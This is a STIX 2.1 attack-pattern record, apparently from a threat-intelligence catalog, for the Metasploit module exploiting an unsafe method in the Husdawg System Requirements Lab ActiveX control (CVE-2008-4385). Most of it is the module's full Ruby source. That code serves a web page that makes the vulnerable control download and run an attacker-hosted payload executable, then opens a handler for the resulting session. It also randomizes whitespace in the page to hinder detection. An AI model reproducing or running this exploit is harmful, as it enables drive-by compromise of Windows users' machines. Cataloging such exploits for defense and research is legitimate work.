{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9c691957-2a05-4bbd-889a-e27534360149",
    "created": "2024-08-14T16:41:05.562456Z",
    "modified": "2024-08-14T16:41:05.56246Z",
    "name": "Husdawg, LLC. System Requirements Lab ActiveX Unsafe Method",
    "description": " This module allows attackers to execute code via an unsafe method in Husdawg, LLC. System Requirements Lab ActiveX Control (sysreqlab2.dll 2.30.0.0)  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/systemrequirementslab_unsafe.rb",
            "external_id": "systemrequirementslab_unsafe.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-4385"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Husdawg, LLC. System Requirements Lab ActiveX Unsafe Method',\n      'Description'    => %q{\n          This module allows attackers to execute code via an unsafe method in\n        Husdawg, LLC. System Requirements Lab ActiveX Control (sysreqlab2.dll 2.30.0.0)\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'MC' ],\n      'References'     =>\n        [\n          [ 'CVE', '2008-4385' ],\n          [ 'OSVDB', '50122' ],\n          [ 'US-CERT-VU', '166651' ],\n        ],\n      'Payload'        =>\n        {\n          'Space'           => 2048,\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2008-10-16'))\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n\n    payload_url =  \"http://\"\n    payload_url += (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']\n    payload_url += \":\" + datastore['SRVPORT'].to_s + get_resource() + \"/payload\"\n\n    if (request.uri.match(/payload/))\n      return if ((p = regenerate_payload(cli)) == nil)\n      data = generate_payload_exe({ :code => p.encoded })\n      print_status(\"Sending payload EXE\")\n      send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })\n      return\n    end\n\n    vname  = rand_text_alpha(rand(100) + 1)\n    exe    = rand_text_alpha(rand(20) + 1)\n\n    content = %Q|\n      <html>\n        <object classid='clsid:67A5F8DC-1A4B-4D66-9F24-A704AD929EEE' id='#{vname}'></object>\n        <script language='JavaScript'>\n          #{vname}.Init(\"#{payload_url}/#{exe}.exe\", \"#{vname}\");\n        </script>\n      </html>\n            |\n\n    content = Rex::Text.randomize_space(content)\n\n    print_status(\"Sending #{self.name}\")\n\n    send_response_html(cli, content)\n\n    handler(cli)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-10-16",
    "x_mitre_platforms": [
        "win'"
    ]
}